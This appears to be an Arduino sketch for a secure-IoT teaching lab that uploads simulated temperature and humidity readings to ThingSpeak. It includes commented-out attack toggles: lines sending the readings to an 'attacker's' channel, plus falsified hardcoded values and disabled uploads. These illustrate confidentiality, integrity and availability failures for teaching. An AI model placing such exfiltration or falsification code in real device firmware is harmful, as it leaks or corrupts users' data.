#include <DHT.h>
#include <ESPping.h>
#include <ThingSpeak.h>
#define DHTPIN 4 
#define DHTTYPE DHT22 
DHT dht(DHTPIN, DHTTYPE);
float temperature, humidity; //initialise temperature/humidity variables to record
WiFiClient client;
unsigned long myChannelNumber =  -;//Your Channel Number (Without Brackets)
const char* myWriteAPIKey = "-"; //Your Write API Key
unsigned long evilChannelNumber = -;//the attacker's channel number
const char* evilWriteAPIKey = "-";//the attacker's write API key
const char *SSID = "-";
const char *PASSWORD = "-";
//const char *SSID = "-";
//const char *PASSWORD = "-"; //setting up a private network for the IoT device to not be in the same network as everyone else, in order to swap, uncomment these 2 lines while commenting the 2 above.
String projectTitle = "- - Implementing Secure IOT Arduino Laboratory";
String projectDesc = "-";
#include "Identification.h"

const float tempMin = 34.00;
const float tempMax = 36.00;
const float humMin = 85.00;
const float humMax = 95.00;
//the above four lines define constants for min and max temperatures and humidities for simulated (randomised) sensor input

void setup() {
Serial.begin(115200);
dht.begin();
ThingSpeak.begin(client);
otaInit(); //comment out this line to disable over-the-air uploads, the entire function is in Identification.h file that is included. 
}

void loop() { //run repeatedly
delay(2500); //start with a 2.5s delay

// temperature = dht.readTemperature();
// humidity = dht.readHumidity();
//the above two ones read temperature and humidity from the sensor and store the values into the respective variables

srand(time(0)); //initialises random number generation using a seed value derived from current system time in seconds
temperature = tempMin + (float)((rand() % ((int)(tempMax - tempMin)*100)))/100; //generates a temperature value from 34.00 to 35.99
temperature = round(temperature * 100)/100; //rounds to 2dp
humidity = humMin + (float)((rand() % ((int)(humMax - humMin)*1000)))/1000; //generates a humidity value from 85.00 to 95.00
humidity = round(humidity * 100)/100; //rounds to 2dp
//the above 5 lines give random temperature and humidity values (to two decimal places) for testing. To restore sensor values, comment out the five lines above, and uncomment out the lines for the sensor acquisition.

//hardcodedtemperature = 10;
//hardcodedhumidity = 30;
//the above 2 lines hardcode constant temperature and humidity values. To restore sensor values, comment out the two lines above.


Serial.println("Temperature is " + String(temperature) + "°C");
Serial.println("Humidity is " + String(humidity) + "%");
//the above 2 lines print out the temperature/humidity outputs

//Serial.println("Temperature is " + String(hardcodedtemperature) + "°C");
//Serial.println("Humidity is " + String(hardcodedhumidity) + "%");
//the above 2 lines print out the hard-coded temperature/humidity outputs (comment out the above 2 lines to not display the "correct" temperature/humidity values)
//(integrity)

//Serial.println(WiFi.status());
//Serial.println(WiFi.localIP());
//the above 2 lines print out the wifi status and IP of the device (probably doesnt need to be done repeatedly, will fix)
//Serial.println("---");
//necessary to perform string conversion above. the dashes are used to separate the outputs.
delay(3000);
//wait 3 seconds before performing the loop again

//WIFI ping
//IPAddress ip (184, 106, 153, 149); // The remote ip to ping (Replace IP address)

// if (Ping.ping(ip)) {
//   Serial.println("Ping works");
// } else {
//   Serial.println("Ping not working");
// }

//the above lines are useful to ascertain if the ThingSpeak IP is pingable. They can be commented out after troubleshooting.

// Serial.println(Ping.ping(ip));

ThingSpeak.writeField(myChannelNumber,1,temperature, myWriteAPIKey);
ThingSpeak.writeField(myChannelNumber,2,humidity, myWriteAPIKey); 
//these 2 lines upload the temperature/humidity values to the cloud
//you can comment out the above 2 lines too to not transmit any values to the cloud (availability)
delay(100);

//ThingSpeak.writeField(evilChannelNumber,1, temperature, evilWriteAPIKey);
//ThingSpeak.writeField(evilChannelNumber,2, humidity, evilWriteAPIKey);
//these 2 lines upload the temperature/humidity values to the attacker's cloud (confidentiality)


//ThingSpeak.writeField(MyChannelNumber,1,hardcodedtemperature, myWriteAPIKey);
//ThingSpeak.writeField(MyChannelNumber,1,hardcodedhumidity, myWriteAPIKey);
//these 2 lines  upload the hardcoded values to the cloud(comment out the above lines that send the 'correct' temperature/humidity values to the cloud) (integrity)
}
